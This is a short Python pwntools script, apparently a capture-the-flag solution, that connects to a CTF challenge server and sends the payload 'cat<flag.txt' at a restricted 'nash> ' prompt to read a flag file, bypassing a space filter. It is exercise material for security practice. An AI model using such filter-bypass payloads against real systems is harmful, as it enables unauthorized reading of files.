from pwn import *

r = remote("ctf.umbccd.io", 4600)

payload = "cat<flag.txt"
r.sendlineafter("nash> ", payload)

r.interactive()
